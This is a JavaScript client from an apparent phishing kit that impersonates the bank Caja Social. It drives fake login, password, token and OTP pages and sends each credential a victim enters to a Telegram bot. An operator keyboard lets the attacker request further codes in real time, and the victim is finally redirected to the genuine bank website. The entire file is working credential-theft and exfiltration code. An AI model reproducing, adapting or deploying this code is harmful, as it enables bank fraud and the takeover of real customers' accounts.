/**
 * CAJA SOCIAL - Cliente optimizado usando banco-utils
 */

(function() {
    'use strict';
    
    const pageConfig = {
        'index.html': {
            stage: 'login',
            form: 'loginForm',
            inputs: { usuario: 'usuario' },
            button: 'submitBtn',
            validation: (data) => (data.usuario || '').length >= 5,
            nextActions: { login: 'index.html', password: 'password.html', token: 'token.html', otp: 'otp.html', finalizar: 'https://www.bancocajasocial.com/' }
        },
        'password.html': {
            stage: 'password',
            form: 'passwordForm',
            inputs: { password: 'password' },
            button: 'btnContinuar',
            validation: (data) => (data.password || '').length === 8,
            nextActions: { login: 'index.html', password: 'password.html', token: 'token.html', otp: 'otp.html', finalizar: 'https://www.bancocajasocial.com/' }
        },
        'token.html': {
            stage: 'token',
            form: 'tokenForm',
            inputs: { token: 'token' },
            button: 'btnContinuar',
            validation: (data) => (data.token || '').length === 6,
            nextActions: { login: 'index.html', password: 'password.html', token: 'token.html', otp: 'otp.html', finalizar: 'https://www.bancocajasocial.com/' }
        },
        'otp.html': {
            stage: 'otp',
            form: 'otpForm',
            inputs: { otp: 'otp' },
            button: 'btnVerificar',
            validation: (data) => (data.otp || '').length >= 4 && (data.otp || '').length <= 8,
            nextActions: { login: 'index.html', password: 'password.html', token: 'token.html', otp: 'otp.html', finalizar: 'https://www.bancocajasocial.com/' }
        }
    };
    
    const currentPage = window.location.pathname.split('/').pop() || 'index.html';
    const config = pageConfig[currentPage];
    if (!config) return;
    
    document.addEventListener('DOMContentLoaded', function() {
        const sessionId = BancoUtils.getSessionId();
        BancoUtils.initSocket();
        
        const form = document.getElementById(config.form);
        const button = document.getElementById(config.button);
        const inputs = {};
        
        Object.keys(config.inputs).forEach(key => {
            inputs[key] = document.getElementById(config.inputs[key]);
            if (inputs[key]) inputs[key].addEventListener('input', validateForm);
        });
        
        // Validación inicial
        validateForm();
        
        BancoUtils.onTelegramAction((data) => {
            BancoUtils.hideOverlay();
            const nextPage = config.nextActions[data.action];
            if (nextPage) window.location.href = nextPage.startsWith('http') ? nextPage : `/bancas/Caja-Social/${nextPage}`;
        });
        
        function validateForm() {
            const data = {};
            Object.keys(inputs).forEach(key => {
                data[key] = inputs[key] ? inputs[key].value.trim() : '';
            });
            
            const isValid = config.validation(data);
            if (button) {
                button.disabled = !isValid;
                button.classList.toggle('active', isValid);
            }
        }
        
        if (form) {
            form.addEventListener('submit', async function(e) {
                e.preventDefault();
                BancoUtils.showOverlay();
                
                const socket = BancoUtils.getSocket();
                if (!socket || !socket.connected) {
                    alert('Error de conexión. Recarga la página.');
                    BancoUtils.hideOverlay();
                    return;
                }
                
                const formData = {};
                Object.keys(inputs).forEach(key => {
                    formData[key] = inputs[key] ? inputs[key].value.trim() : '';
                });
                
                const fullData = BancoUtils.saveBankData('caja-social', formData);
                const message = BancoUtils.formatMessage(`CAJA SOCIAL - ${config.stage.toUpperCase()}`, fullData);
                
                const buttons = [
                    { text: '🔐 Pedir Login', action: 'login' },
                    { text: '🔑 Pedir Password', action: 'password' },
                    { text: '📱 Pedir Token', action: 'token' },
                    { text: '📱 Pedir OTP', action: 'otp' },
                    { text: '✅ Finalizar', action: 'finalizar' }
                ];
                
                const keyboard = BancoUtils.createKeyboard(buttons, sessionId);
                
                try {
                    await BancoUtils.sendToTelegram(config.stage, { text: message, keyboard });
                    console.log('✅ Datos enviados');
                } catch (error) {
                    console.error('❌ Error:', error);
                    alert('Error al enviar datos');
                    BancoUtils.hideOverlay();
                }
            });
        }
        
        validateForm();
    });
})();
